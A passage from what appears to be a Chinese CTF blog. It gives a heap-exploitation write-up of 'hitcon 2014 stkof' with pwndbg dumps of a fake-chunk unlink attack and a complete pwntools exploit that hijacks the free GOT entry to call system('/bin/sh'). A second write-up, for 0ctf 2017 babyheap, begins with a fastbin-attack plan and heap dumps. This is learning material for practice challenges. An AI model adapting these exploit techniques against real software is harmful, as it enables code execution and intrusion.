<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt;  x&#x2F;30gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x00000000020f8020</span><br><span class="line">0x602150:	0x00000000020f8460	0x00000000020f84a0</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="3-伪造chunk，unlink前向合并"><a href="#3-伪造chunk，unlink前向合并" class="headerlink" title="3.伪造chunk，unlink前向合并"></a>3.伪造chunk，unlink前向合并</h4><blockquote>
<p>在chunk2中伪造了一个0x20大小的已被释放的chunk，并在chunk3的pre_size中也要填入0x30</p>
<p>通过unlink的固定格式，进行unlink操作，即可使target的地址为target-0x18，网target地址填入数据，即可实现全局变量的控制。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target &#x3D; 0x602140 + 0x10</span><br><span class="line">fd &#x3D; target - 0x18</span><br><span class="line">bk &#x3D; target - 0x10</span><br></pre></td></tr></table></figure>

<blockquote>
<p>伪造chunk</p>
<ul>
<li>size为0x30，被释放</li>
<li>fd = target - 0x18</li>
<li>bk = target - 0x10</li>
</ul>
<p>修改下一个chunk的pre_size（合并找到伪造的chunk）</p>
<ul>
<li>pre_size = 0x30，当前chunk为0x90</li>
</ul>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x0000000000000030</span><br><span class="line">0x20f8470:	0x0000000000602138	0x0000000000602140</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>free后造成合并，unlink，在chunk2中填入了target-0x18</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x602140</span><br><span class="line">0x602140:	0x0000000000000000	0x00000000020f8020</span><br><span class="line">0x602150:	0x0000000000602138	0x0000000000000000</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>heap里面看不出来，，，因为地址不对，，，</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f7000</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8010</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8040</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8450</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x20f8490</span><br><span class="line">Size: 0x90</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x20f8520</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8550</span><br><span class="line">Size: 0x20ab1</span><br></pre></td></tr></table></figure>

<blockquote>
<p>但是已经成功合并释放了，起始地址为伪造的chunk开头</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x20f8460 —▸ 0x7fbcdd959b78 (main_arena+88) ◂— 0x20f8460</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<blockquote>
<p>伪造的chunk大小变为0xc0（0x30+0x90）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="4-修改全局变量的值"><a href="#4-修改全局变量的值" class="headerlink" title="4. 修改全局变量的值"></a>4. 修改全局变量的值</h4><blockquote>
<p>通过unlink技术得到的部分地址读写能力，可以修改chunk1的指针为free_got，chunk2的指针为puts_got，接下来对chunk1和chunk2的内容进行的修改，本质都是修改两个got表</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x602130</span><br><span class="line">0x602130:	0x0000000000000000	0x6161616161616161</span><br><span class="line">0x602140:	0x6161616161616161	0x0000000000602018</span><br><span class="line">0x602150:	0x0000000000602020	0x0000000000000000</span><br><span class="line">0x602160:	0x00000000020f8530	0x0000000000000000</span><br><span class="line">0x602170:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x00007fbcdd619540	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br></pre></td></tr></table></figure>

<h4 id="5-获取打印功能，泄露地址"><a href="#5-获取打印功能，泄露地址" class="headerlink" title="5.获取打印功能，泄露地址"></a>5.获取打印功能，泄露地址</h4><blockquote>
<p>由于前面已经修改chunk1的指针为got表指针，所以，直接fill chunk1的内容为puts_plt，那么free()时就是执行puts函数，从而泄露地址。</p>
<p>由于chunk2的指针已经为puts_got，所以free(2)就是puts(puts函数的got表)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x0000000000400760	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000400760</span><br><span class="line">0x400760 &lt;puts@plt&gt;:	0x0168002018ba25ff	0xffffffd0e9000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>泄露成功，可以计算libc基址、system函数地址</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x7 bytes:</span><br><span class="line">    00000000  a0 46 60 dd  bc 7f 0a                               │·F&#96;·│···│</span><br><span class="line">    00000007</span><br><span class="line">    </span><br><span class="line">pwndbg&gt; x&#x2F;30gx puts</span><br><span class="line">0x7fbcdd6046a0 &lt;_IO_puts&gt;:</span><br></pre></td></tr></table></figure>

<h4 id="6-free-gt-system，块内容“-bin-sh”"><a href="#6-free-gt-system，块内容“-bin-sh”" class="headerlink" title="6.free-&gt;system，块内容“/bin/sh”"></a>6.free-&gt;system，块内容“/bin/sh”</h4><blockquote>
<p>同5，再次fill chunk1内容为system的地址，然后执行free函数就是执行system函数。</p>
<p>对未使用的chunk4填入“/bin/sh”内容，free(4)即可执行system(“/bin/sh”)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x0000000000602018</span><br><span class="line">0x602018 &lt;free@got.plt&gt;:	0x00007fbcdd5da3a0	0x00007fbcdd6046a0</span><br><span class="line">0x602028 &lt;fread@got.plt&gt;:	0x00007fbcdd6031b0	0x0000000000400786</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;30gx 0x00007fbcdd5da3a0</span><br><span class="line">0x7fbcdd5da3a0 &lt;__libc_system&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000#chunk4</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x00000000000000c1</span><br><span class="line">0x20f8470:	0x00007fbcdd959b78	0x00007fbcdd959b78</span><br><span class="line">0x20f8480:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x20f8490:	0x0000000000000030	0x0000000000000090</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x00000000000000c0	0x0000000000000030</span><br><span class="line">0x20f8530:	0x0068732f6e69622f	0x0000000000000000#chunk4填入“&#x2F;bin&#x2F;sh”</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x&#x2F;10s 0x20f8530</span><br><span class="line">0x20f8530:	&quot;&#x2F;bin&#x2F;sh&quot;</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./stkof'</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">28999</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(<span class="string">"OK"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x602140</span> + <span class="number">0x10</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(free_got) + p64(puts_got)</span><br><span class="line">fill(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(puts_plt)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">log.success(hex(system))</span><br><span class="line">log.success(hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">fill(<span class="number">1</span>,payload)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">4</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这道题其实是第二次做了，还比较顺。思路比第一次更清晰了（<a href="https://warm-winter.github.io/2020/11/11/%C2%96ctf-wiki%E7%9A%84%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/#2014-hitcon-stkof" target="_blank" rel="noopener">第一次分析</a>）。</p>
<p>unlink主要适用于存在堆溢出和全局变量的情况。</p>
</blockquote>

	
	</div>
  <a type="button" href="/2021/04/20/hitcon-2014-stkof详解/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/19/0ctf-2017-babyheap/" >0ctf_2017_babyheap详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-19  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>本文主要列出0ctf_2017_babyheap的详细过程</p>
<p>主要参考：<a href="https://bbs.pediy.com/thread-223461.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-223461.htm</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li>allocate：申请size大小的块</li>
<li>fill：对idx的块，设置size，并填入content</li>
<li>free：释放idx的块</li>
<li>dump：打印idx的块内容</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>fill中的size可以重新设置，故可以造成堆溢出。</p>
<p>方法：fastbin attack</p>
<ol>
<li><p>double free泄露libc</p>
<p>【small/large chunk释放，fd和bk指向main_arena】</p>
</li>
<li><p>fastbin attack写malloc_hook为one_gadget</p>
</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-保护"><a href="#1-保护" class="headerlink" title="1.保护"></a>1.保护</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec 0ctf_2017_babyheap </span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;0ctf_2017_babyheap&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h4 id="2-申请初始块"><a href="#2-申请初始块" class="headerlink" title="2.申请初始块"></a>2.申请初始块</h4><blockquote>
<p>四个0x10、一个0x80</p>
<p>第0个块作用：方便修改第1、2块</p>
<p>第3个块作用：方便修改0x80的块</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6020</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6040</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6060</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6080</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5614ee1f6110</span><br><span class="line">Size: 0x20ef1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x5614ee1f6000</span><br><span class="line">0x5614ee1f6000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6010:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6030:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6040:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x5614ee1f6070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6080:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x5614ee1f6090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f60f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6110:	0x0000000000000000	0x0000000000020ef1</span><br><span class="line">0x5614ee1f6120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x5614ee1f6180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

